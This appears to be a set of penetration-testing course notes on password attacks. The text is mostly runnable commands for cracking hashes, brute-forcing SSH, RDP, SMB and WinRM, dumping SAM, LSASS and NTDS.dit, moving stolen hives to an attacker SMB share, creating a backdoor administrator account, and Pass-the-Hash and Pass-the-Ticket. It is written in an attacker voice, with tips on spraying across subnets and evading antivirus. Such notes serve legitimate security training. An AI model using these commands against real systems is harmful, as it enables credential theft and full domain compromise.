Access & Tooling/Module 10

Password Attacks

1. Theory of Protection & Authentication

The CIA Triad

  • Confidentiality, Integrity, Availability — the three pillars of InfoSec
  • Authentication = validating identity using one or more of:
    1. Something you know — password, PIN, passphrase
    2. Something you have — ID card, security key, MFA token
    3. Something you are — biometrics (fingerprint, face)

Why Passwords Are the Target

  • 8-digit alphanumeric passwords have 208,827,064,576 possible combinations (36^8), but humans are predictable
  • 24% of Americans use passwords like password, Qwerty, or 123456
  • 22% use their name; 33% use pet/children names
  • 66% reuse passwords across multiple platforms → once you get one, you often get them all
  • 55% don't change passwords even after a known data breach

💡 Attacker Insight: With 66% password reuse, a single cracked credential is your gateway to many systems. Always test found credentials across every reachable service.

Useful Resource: HaveIBeenPwned — check if an email appears in known breach databases.

2. Credential Storage

Linux — /etc/shadow

Linux stores password hashes in /etc/shadow (readable only by root) and references them from /etc/passwd with an x placeholder.

Shadow file format:

username:$id$salt$hash:last_change:min_age:max_age:warn_period:::

Hash type identifiers ($id$):

ID Algorithm
$1$ MD5
$2a$ Blowfish
$5$ SHA-256
$6$ SHA-512 (modern default)
$y$ Yescrypt
$gy$ Gost-yescrypt
$7$ Scrypt

Example entry:

htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::

💡 Why it matters: If you can read /etc/shadow (via SUID exploit, sudo misconfiguration, etc.), extract the hashes and crack them offline. SHA-512 ($6$) is hard; MD5 ($1$) is easy.

/etc/passwd — if password field is empty: The system won't require a password to log in. This is a critical misconfiguration to look for.

# If /etc/passwd is writable, clear the root password field:
# Before: root:x:0:0:root:/root:/bin/bash
# After:  root::0:0:root:/root:/bin/bash
# Then: su root (no password needed)

Windows — SAM, LSASS, NTDS.dit

SAM Database

  • Location: %SystemRoot%/system32/config/SAM — requires SYSTEM-level access
  • Stores passwords as LM hash or NTLM hash
  • Domain-joined systems validate against the DC's ntds.dit, not SAM
  • SYSKEY (syskey.exe) partially encrypts SAM — need the bootkey to decrypt

Windows Authentication Flow

User Login → WinLogon → LogonUI (credential providers) → LSASS → SAM or AD

LSASS key components:

DLL Purpose
Lsasrv.dll Enforces security policies; selects NTLM or Kerberos
Msv1_0.dll Local machine logons without custom auth
Samsrv.dll Manages SAM database
Kerberos.dll Kerberos-based authentication
Ntdsa.dll Creates records in Windows registry

Credential Manager

  • Stores saved credentials for network resources in the Credential Locker
  • Location: C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]

NTDS.dit

  • The Active Directory database file on Domain Controllers
  • Location: %SystemRoot%\ntds.dit
  • Synchronized across all DCs (except Read-Only DCs)
  • Contains: user accounts (username + password hash), group accounts, computer accounts, Group Policy Objects
  • If compromised → entire domain is compromised

3. John the Ripper

Tool: john (John the Ripper) — GitHub
Open-source password cracker. Use the Jumbo variant for best results.

Attack Methods Overview

Method Description
Dictionary Uses a pre-made wordlist; fast, effective
Brute Force Tries every character combination; very slow
Rainbow Table Pre-computed hash → plaintext lookup; fast but table-size limited

Cracking Modes

Single Crack Mode

Tries each word from a wordlist one by one. Most basic approach.

john --format=<hash_type> <hash_file>
john --format=sha256 hashes_to_crack.txt
  • Output goes to ~/.john/john.pot
  • Check progress: john --show hashes_to_crack.txt

Wordlist Mode

Uses one or more wordlists, optionally with mangling rules.

john --wordlist=<wordlist.txt> --rules <hash_file>

Incremental Mode

Generates all character combinations on the fly. Most powerful, most time-consuming.

john --incremental <hash_file>
  • Default charset: a-zA-Z0-9 — for special characters, define a custom charset

Supported Hash Formats (Key Examples)

john --format=nt hashes.txt          # Windows NT/NTLM
john --format=LM hashes.txt          # Windows LAN Manager (legacy)
john --format=sha256 hashes.txt      # Raw SHA-256
john --format=sha512crypt hashes.txt # Linux SHA-512 ($6$)
john --format=md5crypt hashes.txt    # Linux MD5 ($1$)
john --format=krb5 hashes.txt        # Kerberos 5
john --format=netntlm hashes.txt     # Net-NTLM (captured challenge/response)
john --format=netntlmv2 hashes.txt   # Net-NTLMv2
john --format=ssh hashes.txt         # Encrypted SSH private key
john --format=zip hashes.txt         # ZIP archive
john --format=rar hashes.txt         # RAR archive
john --format=pdf hashes.txt         # PDF password

Converter Tools (*2john)

These scripts convert file formats into hashes john can work with.
Find them all with: locate *2john*

Tool Use Case
ssh2john.py Encrypted SSH private keys
office2john.py Password-protected Word, Excel, etc.
pdf2john.pl Password-protected PDFs
zip2john Password-protected ZIP files
rar2john Password-protected RAR files
bitlocker2john BitLocker encrypted drives
keepass2john KeePass databases
putty2john PuTTY private keys

General workflow:

# Step 1: Convert file to hash
<tool> <file_to_crack> > file.hash

# Step 2: Crack the hash
john --wordlist=rockyou.txt file.hash

# Step 3: View results
john file.hash --show

4. Network Services Brute-Forcing

🎯 Goal Obtain valid credentials for a remote service using automated login attempts.
Key Tools: Hydra, CrackMapExec (netexec), Evil-WinRM, Metasploit

Connecting to Target Services (Cheatsheet)

# RDP — Remote Desktop Protocol
xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!

# WinRM — Windows Remote Management
evil-winrm -i <ip> -u user -p password

# SSH
ssh user@<ip>

# SMB Share
smbclient -U user \\\\<ip>\\SHARENAME

# Create SMB share on attack host (to receive files from target)
python3 smbserver.py -smb2support CompData /home/<user>/Documents/

WinRM

Windows Remote Management — Microsoft's WS-Management implementation using XML/SOAP over HTTP.
- Ports: TCP 5985 (HTTP), TCP 5986 (HTTPS)
- Default on Windows Server; must be manually enabled on Windows 10

Why target WinRM? Getting WinRM access gives you a remote PowerShell session — interactive, scriptable, and hard to detect compared to RDP.

CrackMapExec (now: netexec) — WinRM Brute Force

Tool: CrackMapExec / netexec — Swiss army knife for AD network pentesting
Install: sudo apt-get -y install crackmapexec

# Brute force WinRM with user list and password list
crackmapexec winrm <ip> -u user.list -p password.list
# or
netexec winrm <ip> -u user.list -p password.list

Reading the output:
- [+] with (Pwn3d!) = valid credentials AND user has admin rights → you can exec commands
- [+] without (Pwn3d!) = valid credentials, but limited access

Evil-WinRM — Remote Shell

Tool: evil-winrm — Full PowerShell remoting shell over WinRM
Install: sudo gem install evil-winrm

# Connect with password
evil-winrm -i <target-ip> -u user -p password

# Connect with NT hash (Pass-the-Hash)
evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
➜ What you get An interactive PowerShell session (*Evil-WinRM* PS C:\>). From here you can execute commands, transfer files, load scripts, etc.

SSH

Secure Shell — encrypted remote access, default port TCP/22. Uses three cryptographic operations: symmetric (session), asymmetric (key exchange), hashing (integrity).

Hydra — SSH Brute Force

Tool: Hydra — Network login brute-forcer
GitHub: https://github.com/vanhauser-thc/thc-hydra

# -L = user list file, -P = password list file
hydra -L user.list -P password.list ssh://<ip>

# -l = single username, -P = password list
hydra -l username -P password.list ssh://<ip>

# -L = user list, -p = single password
hydra -L user.list -p password ssh://<ip>

# -C = credential pairs file (user:pass format) — credential stuffing
hydra -C user_pass.list ssh://<ip>

⚠️ SSH has rate-limiting; reduce threads with -t 4 to avoid triggering lockouts.

After getting creds:

ssh user@<ip>
# Enter password when prompted

RDP

Remote Desktop Protocol — graphical remote access, default port TCP/3389.

Hydra — RDP Brute Force

hydra -L user.list -P password.list rdp://<ip>

⚠️ Use -t 1 or -t 4 for RDP; it doesn't like parallel connections.

xfreerdp — Connect via CLI

xfreerdp /v:<target-ip> /u:<username> /p:<password>

# Pass-the-Hash RDP
xfreerdp /v:<ip> /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

⚠️ PtH via RDP requires HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRestrictedAdmin to be set to 0 on the target.

SMB

Server Message Block — file sharing protocol (Windows networks). Port TCP/445. Also called CIFS. Open-source implementation: Samba.

Hydra — SMB Brute Force

hydra -L user.list -P password.list smb://<ip>

⚠️ Hydra may fail with newer SMBv3 servers. Use Metasploit if you get [ERROR] invalid reply.

Metasploit — SMB Login

msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE user.list
set PASS_FILE password.list
set RHOSTS <ip>
run

CrackMapExec — Enumerate SMB Shares

# After getting valid creds, list available shares and permissions
crackmapexec smb <ip> -u "user" -p "password" --shares
netexec smb <ip> -u "user" -p "password" --shares
🔍 What you're looking for Shares with READ or WRITE permissions → potential for credential files, scripts, sensitive data.

smbclient — Browse Shares

smbclient -U user \\\\<ip>\\SHARENAME
# After connecting:
smb: \> ls           # List contents
smb: \> get file     # Download file
smb: \> put file     # Upload file

5. Password Mutations & Custom Wordlists

Why? Default wordlists miss context-specific passwords. Users create passwords that follow patterns — company name + year + special char — and we need to replicate those patterns.

Common Password Patterns

Pattern Example
Capitalized first letter Password
Add numbers Password123
Add year Password2022
Add month Password02
Exclamation at end Password2022!
Leet speak + special P@ssw0rd2022!

Hashcat — Rule-Based Mutations

Tool: Hashcat — GPU-accelerated password cracker + mutation engine
Docs: https://hashcat.net/wiki/doku.php?id=rule_based_attack

Rule function syntax:

Function Effect
: Do nothing (keep word as-is)
l Lowercase all letters
u Uppercase all letters
c Capitalize first letter, lowercase rest
sXY Replace all X with Y (e.g., so0 replaces 'o' with '0')
$! Append ! at the end

Create a custom rule file:

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@

Apply rules to generate mutated wordlist:

# --force = ignore warnings
# -r custom.rule = apply rule file
# --stdout = print mutations to stdout
# sort -u = deduplicate
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

What the output looks like:

password, Password, passw0rd, Passw0rd, p@ssword, P@ssword, P@ssw0rd,
password!, Password!, passw0rd!, p@ssword!, Passw0rd!, P@ssword!, p@ssw0rd!, P@ssw0rd!

Use Hashcat's built-in rules:

ls /usr/share/hashcat/rules/
# Key ones: best64.rule, rockyou-30000.rule, d3ad0ne.rule, dive.rule, T0XlC.rule

Then brute-force with the mutated list:

hashcat -m 1000 hashes.txt mut_password.list

CeWL — Website Wordlist Generator

Tool: CeWL — Custom Wordlist Generator from web content
Use case: Scrape company websites to build target-specific wordlists

# Spider site 4 levels deep (-d 4)
# Minimum word length 6 (-m 6)
# Lowercase all words (--lowercase)
# Save to file (-w)
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist  # Check how many words were collected

Why? Companies often use their own name, products, locations, and industry terms in passwords. CeWL finds those exact words automatically.

Username Anarchy — Generate Username Variants

Tool: username-anarchy — Converts real names to username formats

# Generate username variations from a list of real names
./username-anarchy -i /path/to/listoffirstandlastnames.txt

Common username conventions to try:

Convention Example (Jane Jill Doe)
firstinitiallastname jdoe
firstinitialmiddleinitiallastname jjdoe
firstnamelastname janedoe
firstname.lastname jane.doe
lastname.firstname doe.jane

Download Compressed File Extensions List

# Useful for finding files that might contain passwords
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

6. Password Reuse / Default Passwords

Credential Stuffing

Using known default or previously compromised credentials against services.

Key resource: DefaultCreds-Cheat-Sheet — a compiled list of default credentials for hundreds of products.

Common default credentials examples:

Product Username Password
Zyxel SSH zyfwp PrOw!aN_fXp
Kanboard admin admin
Kali Linux kali kali
D-Link web admin admin
F5 admin admin

Hydra — credential stuffing (user:pass pairs):

# -C = use colon-separated credential file (user:pass format)
hydra -C user_pass.list ssh://<ip>
hydra -C <user_pass.list> <protocol>://<IP>

💡 OSINT Tip: Google "@company.com" filetype:pdf to find email addresses and infer username formats. Then Google default credentials for any software/hardware you discover on the target.

7. Attacking SAM (Windows)

🎯 Goal Dump local password hashes from a compromised Windows host for offline cracking.
Requires: Local administrator privileges

Step 1 — Copy Registry Hives with reg.exe

The SAM database is protected while Windows is running. We export the registry hives instead.

# These three hives are what we need:
reg.exe save hklm\sam C:\sam.save          # Contains local account hashes
reg.exe save hklm\system C:\system.save    # Contains the bootkey to decrypt SAM
reg.exe save hklm\security C:\security.save  # Contains cached domain credentials (if domain-joined)

Why all three? The SAM database is encrypted with the bootkey stored in hklm\system. You need both to decrypt anything. hklm\security is bonus — it can contain cached domain credentials.

Step 2 — Transfer to Attack Host via SMB

On attack host — create an SMB share:

# -smb2support is required for modern Windows (SMBv1 disabled by default)
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<user>/Documents/

On target — move files to share:

move sam.save \\<attacker-ip>\CompData
move security.save \\<attacker-ip>\CompData
move system.save \\<attacker-ip>\CompData

Step 3 — Dump Hashes with Impacket secretsdump.py

Tool: Impacket secretsdump.py — Extract credentials from SAM/NTDS/LSA offline

# Locate the tool
locate secretsdump

# Dump hashes from the three hive files
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Output format: username:RID:LM_hash:NT_hash:::
- The NT hash (last field before :::) is what you crack
- 31d6cfe0d16ae931b73c59d7e0c089c0 = empty password (NT hash of blank)

Step 4 — Crack NT Hashes with Hashcat

# Put NT hashes in a text file
vim hashestocrack.txt
# (paste just the NT hashes, one per line)

# Crack with Hashcat
# -m 1000 = NTLM hash type
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

Crack a single hash:

hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

Remote Dumping — via Network (with admin creds)

# Dump SAM remotely
netexec smb <ip> --local-auth -u <username> -p <password> --sam

# Dump LSA Secrets remotely (can reveal clear-text credentials!)
netexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Dump NTDS.dit hashes from a Domain Controller
netexec smb <ip> -u <username> -p <password> --ntds

💡 What next? Cracked passwords can be reused across other systems. Uncracked hashes can be used in Pass-the-Hash attacks (see Section 12).

8. Attacking LSASS (Windows)

🎯 Goal Extract active credential material (hashes, tickets, clear-text) from LSASS process memory.
LSASS (Local Security Authority Subsystem Service) caches credentials for active sessions.

On login, LSASS:
- Caches credentials locally in memory
- Creates access tokens
- Enforces security policies
- Writes to Windows security log

Step 1 — Find LSASS Process ID

# In cmd:
tasklist /svc
# Look for: lsass.exe  672  KeyIso, SamSs, VaultSvc

# In PowerShell:
Get-Process lsass
# Note the 'Id' field

Why do we need the PID? The dump command requires it to target the right process.

Step 2 — Create LSASS Memory Dump

Method A — Task Manager (GUI)

Right-click Local Security Authority Process → Create dump file
Output: C:\Users\<user>\AppData\Local\Temp\lsass.DMP

Method B — Rundll32 (CLI)

# 672 is the LSASS PID — replace with the actual PID you found
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

⚠️ Modern AV tools detect and block this method. You may need to bypass AV first.

Step 3 — Parse Dump with Pypykatz

Tool: Pypykatz — Mimikatz reimplemented in Python (runs on Linux)
Use when you have the .dmp file on your Linux attack host.

pypykatz lsa minidump /path/to/lsass.dmp

What pypykatz extracts:

Section What it contains
MSV NT hash + SHA1 hash for the user (for offline cracking or PtH)
WDIGEST Clear-text password on Windows XP–8, Server 2003–2012 (disabled by default on modern systems)
Kerberos Passwords, ekeys, tickets, pins (usable for Kerberos attacks)
DPAPI Master keys for decrypting browser-stored passwords, saved credentials, Outlook, etc.

💡 WDIGEST Warning: If targeting older systems (pre-Windows 8.1 / Server 2012 R2) or misconfigured modern systems, WDIGEST may be enabled and you'll get clear-text passwords directly from the dump.

9. Attacking Active Directory & NTDS.dit

🎯 Goal Compromise all domain accounts by extracting hashes from the NTDS.dit database on a Domain Controller.

Phase 1 — Dictionary Attack Against AD Accounts

Enumerate usernames first:

# Generate usernames from real names
./username-anarchy -i /home/ltnbob/names.txt

Attack with CrackMapExec:

# Brute force one user against a DC
crackmapexec smb <dc-ip> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

# Look for: [+] inlanefrieght.local\bwilliamson:P@55w0rd!

⚠️ Account Lockout Risk: Dictionary attacks can lock out accounts. Check the domain's lockout policy before spraying. By default, Windows domains have NO lockout policy — but enterprise environments may differ.

💡 Event Log Awareness: These login attempts appear in the Windows Security Event Log. Defenders watching Event ID 4625 (failed logon) will see your attack.

Phase 2 — Connect to DC with Valid Credentials

evil-winrm -i <dc-ip> -u bwilliamson -p 'P@55w0rd!'

Check privileges:

# Check group membership
net user bwilliamson
# Look for: Domain Admins (or Administrators)

net localgroup

You need: Domain Admin or local Administrators group membership to dump NTDS.

Phase 3 — Create Volume Shadow Copy

VSS (Volume Shadow Copy Service) lets us copy NTDS.dit even though it's locked by AD.

*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
# Note the Shadow Copy Volume Name e.g.: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

Phase 4 — Copy NTDS.dit from Shadow Copy

*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

Phase 5 — Transfer to Attack Host & Dump Hashes

# Transfer via SMB share (set up smbserver.py first)
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<attacker-ip>\CompData

# Dump with secretsdump
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Faster alternative — CrackMapExec does it all in one command:

# This automatically uses VSS to dump NTDS
crackmapexec smb <dc-ip> -u bwilliamson -p P@55w0rd! --ntds
netexec smb <dc-ip> -u <username> -p <password> --ntds

Pass-the-Hash with Cracked/Obtained Hashes

# If you crack a hash:
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
# Output: 64f12cddaa88057e06a81b54e73b949b:Password1

# If you can't crack it, use it directly (Pass-the-Hash):
evil-winrm -i <ip> -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"

10. Credential Hunting in Windows

🎯 Goal Find credentials stored in files, applications, and memory on a compromised Windows host.

Key Search Terms

Passwords  Passphrases  Keys  Username  User account  Creds  Users
Passkeys  configuration  dbcredential  dbpassword  pwd  Login  Credentials

findstr — Search Files for Passwords

# Search common config/script file types for the word "password"
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
  • /S = search subdirectories
  • /I = case-insensitive
  • /M = print only filenames with matches

tasklist — Enumerate Running Services

tasklist /svc

Why? Shows running processes and associated services. Useful for identifying the target system's purpose (web server? database? mail?) which guides your credential hunting approach.

cmdkey — List Saved Credentials

cmdkey /list

Why? Shows credentials stored in Windows Credential Manager. These could be RDP sessions, network share logins, etc.

rundll32 — Access Credential Manager GUI

rundll32 keymgr.dll,KRShowKeyMgr

runas — Execute as Stored User

# If a credential is stored for a user, impersonate them without knowing the password
runas /savecred /user:<username> cmd

Lazagne — Automated Credential Extraction

Tool: Lazagne — extracts credentials from browsers, SSH clients, databases, mail clients, etc.
GitHub: https://github.com/AlessandroZ/LaZagne

# Run all modules
start lazagne.exe all

# Verbose mode (see what it's checking)
start lazagne.exe all -vv

Lazagne can extract from: WinSCP, Firefox, Chrome, Thunderbird, KeePass, FileZilla, Outlook, RDP sessions, and many more.

Snaffler / Invoke-HuntSMBShares — Network Share Hunting

# Snaffler — search network shares for interesting files
snaffler.exe -s

# PowerShell — search and save results
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

High-Value Hunting Locations

  • KeePass databases (.kdbx) — pull hash, crack → get a vault full of credentials
  • unattend.xml files — Windows deployment files often contain plaintext passwords
  • Scripts on IT shares (SYSVOL, network shares)
  • web.config on dev machines
  • AD user/computer description fields
  • Files: pass.txt, passwords.docx, passwords.xlsx on user systems and SharePoint

11. Credential Hunting in Linux

🎯 Goal Find credentials stored in files, processes, history, browser storage, and memory on a compromised Linux host.

Configuration Files — .conf, .config, .cnf

# Find all config files
for l in $(echo ".conf .config .cnf"); do
    echo -e "\nFile extension: " $l
    find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core"
done

# Search config files for credentials
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib"); do
    echo -e "\nFile: " $i
    grep "user|password|pass" $i 2>/dev/null | grep -v "\#"
done

Database Files

for l in $(echo ".sql .db .*db .db*"); do
    echo -e "\nDB File extension: " $l
    find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man"
done

Notes & Text Files

find /home/* -type f -name "*.txt" -o ! -name "*.*"

Script Files (.py, .sh, .pl, etc.)

for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
    echo -e "\nFile extension: " $l
    find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share"
done

Document Files (could contain embedded creds)

for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"); do
    echo -e "\nFile extension: " $ext
    find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core"
done

Cronjobs — Check for Hardcoded Credentials

cat /etc/crontab
ls -la /etc/cron.*/

Why? Scripts in cronjobs often hardcode usernames and passwords to run automatically without user interaction.

SSH Keys

# Find private keys (look for "PRIVATE KEY" header in files)
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Find public keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

Bash History

# View last 5 lines of all bash history files for all users
tail -n5 /home/*/.bash*

Why? Users often run commands with passwords in plain text (e.g., mysql -u root -pSecretPassword) and these get saved to history.

Memory — Mimipenguin

Tool: Mimipenguin — extracts credentials from Linux process memory (similar to Mimikatz)
Requires: root/sudo

sudo python3 mimipenguin.py
sudo bash mimipenguin.sh

What it finds: Clear-text passwords from GNOME keyring, GNOME session, and other sources.

Memory — LaZagne (Linux)

# All modules
sudo python2.7 lazagne.py all

# Just browsers
python3 lazagne.py browsers

Firefox Stored Credentials

# Find Firefox profiles
ls -l .mozilla/firefox/ | grep default

# View encrypted credentials (JSON)
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# Decrypt with Firefox_decrypt (requires Python 3.9+)
python3.9 firefox_decrypt.py

PAM Files — passwd, shadow, opasswd

# View shadow file (requires root)
sudo cat /etc/shadow

# Check old passwords file
sudo cat /etc/security/opasswd

Interesting in opasswd: Old passwords are often stored with MD5 ($1$) even if the current system uses SHA-512. MD5 is much faster to crack. Old passwords also reveal the user's password patterns — if you know their old passwords were Summer2020!, try Summer2021!, Summer2022!, etc.

Cracking Linux Credentials

# Combine passwd and shadow for cracking
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Crack SHA-512 hashes (-m 1800)
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Crack MD5 hashes from opasswd (-m 500)
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

12. Pass the Hash (PtH)

Concept: Authenticate using an NTLM hash instead of a plaintext password. NTLM doesn't require the plaintext — just the hash. The hash is static per session until the password changes.
Requirement: Local admin or Domain Admin privileges to obtain hashes in the first place.

Hashes can be obtained from:
- Dumping the local SAM database
- Extracting from NTDS.dit on a Domain Controller
- Pulling from LSASS memory

Mimikatz — PtH from Windows

Tool: Mimikatz — Windows credential extraction toolkit
Author: Benjamin Delpy — http://blog.gentilkiwi.com/mimikatz

# sekurlsa::pth opens a new cmd.exe running as the target user
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

# Parameters:
# /user    = username to impersonate
# /rc4 or /NTLM = NT hash
# /domain  = domain (use "." for local accounts)
# /run     = program to launch (defaults to cmd.exe)

What happens: A new cmd.exe window opens authenticated as the target user. From there, you can access network resources that user has permission to.

Invoke-TheHash — PtH from Windows (PowerShell)

Tool: Invoke-TheHash — PowerShell PtH via WMI and SMB (no admin required client-side)

# Import module
Import-Module .\Invoke-TheHash.psd1

# Execute command via SMB (e.g., create backdoor admin user)
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# Execute command via WMI
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<reverse shell command>"

Impacket — PtH from Linux

Tool: Impacket — Python library for network protocols with built-in PtH support

# PsExec — gives SYSTEM shell
impacket-psexec administrator@<ip> -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# Other Impacket PtH tools:
impacket-wmiexec administrator@<ip> -hashes :<hash>
impacket-atexec administrator@<ip> -hashes :<hash>
impacket-smbexec administrator@<ip> -hashes :<hash>

CrackMapExec — PtH from Linux (Network-Wide)

# Try hash against entire subnet (spray)
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Spray with local auth only (avoids locking domain accounts)
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth

# Execute command on target
crackmapexec smb <ip> -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

💡 LAPS Tip: If the organization uses LAPS (Local Administrator Password Solution), local admin passwords are randomized per machine. PtH spraying won't work across hosts in that case.

Evil-WinRM — PtH from Linux

evil-winrm -i <ip> -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

RDP — PtH

# Requires DisableRestrictedAdmin=0 on target
xfreerdp /v:<ip> /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

UAC Limitation

UAC restricts PtH for local accounts. Only the built-in Administrator (RID-500) account can perform remote PtH by default. Domain admin accounts are not affected by this restriction.

13. Pass the Ticket (PtT) from Windows

Concept: Steal a Kerberos ticket (TGT or TGS) and use it for authentication — no password or hash needed.
Key protocols: Kerberos uses tickets to authenticate, not repeated credential checks.

Kerberos Refresher

  • TGT (Ticket Granting Ticket): First ticket obtained; used to request service tickets
  • TGS (Ticket Granting Service): Authorizes access to specific services
  • KDC (Key Distribution Center): Issues tickets; runs on the Domain Controller

Harvesting Tickets — Mimikatz

mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
# Creates .kirbi files for each session
# Files ending in $ = computer account tickets
# Files with username@ = user tickets

Harvesting Tickets — Rubeus

Tool: Rubeus — C# tool for Kerberos abuse

# Dump all tickets (base64 encoded)
Rubeus.exe dump /nowrap

Pass the Key / OverPass the Hash

Convert an NTLM hash (or AES key) into a full Kerberos TGT. Useful for bypassing restrictions.

Extract Kerberos keys with Mimikatz:

mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
# Look for: aes256_hmac, rc4_hmac_nt

Forge TGT with Mimikatz:

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

Forge TGT with Rubeus:

Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

⚠️ Using RC4 (NTLM) hash instead of AES256 in Kerberos may be flagged as "encryption downgrade" by defenders. Prefer AES256 when available.

Pass the Ticket — Rubeus

# Request TGT and immediately import it into current session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# Import existing .kirbi file
Rubeus.exe ptt /ticket:[0;6c680]-0-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# Import base64-encoded ticket
Rubeus.exe ptt /ticket:<base64_string>

# Verify ticket is in session
klist

Pass the Ticket — Mimikatz

mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-0-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

PowerShell Remoting with Stolen Tickets

# After importing ticket with Mimikatz:
powershell
Enter-PSSession -ComputerName DC01
# Now you're in a PowerShell session on DC01 as the stolen user

# With Rubeus (create sacrificial process first):
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# Then in the new window:
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<hash> /ptt
Enter-PSSession -ComputerName DC01

14. Pass the Ticket (PtT) from Linux

Context: Linux machines joined to Active Directory use Kerberos for authentication. Tickets are stored as ccache files (/tmp/krb5cc_*) or keytab files.

Finding Kerberos Artifacts on Linux

# Check if machine is domain joined
realm list

# Check for SSSD or Winbind (confirms AD integration)
ps -ef | grep -i "winbind\|sssd"

# Check current Kerberos ticket location
env | grep -i krb5   # Look for KRB5CCNAME variable

# List ccache files in /tmp
ls -la /tmp | grep krb5cc

# Find keytab files
find / -name *keytab* -ls 2>/dev/null

# Check cronjobs for keytab usage
crontab -l
cat /etc/crontab

Abusing Keytab Files

# Read keytab file info (which user/principal it was created for)
klist -k -t /opt/specialfiles/carlos.keytab

# Impersonate user using keytab (imports ticket into current session)
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Verify ticket
klist

# Now use the ticket to access resources
smbclient //dc01/carlos -k -c ls

Extract Hashes from Keytab

Tool: KeyTabExtract — https://github.com/sosdave/KeyTabExtract

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
# Extracts: NTLM hash, AES-256 hash, AES-128 hash

# NTLM hash → use for Pass-the-Hash attacks or crack with Hashcat
# Or use online: https://crackstation.net/

Abusing ccache Files (Active Sessions)

# As root, list all ccache files
ls -la /tmp/krb5cc*

# Set KRB5CCNAME to use a different user's ticket
export KRB5CCNAME=/tmp/krb5cc_647401106_tBswau

# Verify whose ticket you're using
klist

# Use ticket to access resources
smbclient //dc01/C$ -k -c ls -no-pass

Using Linux Attack Tools with Kerberos

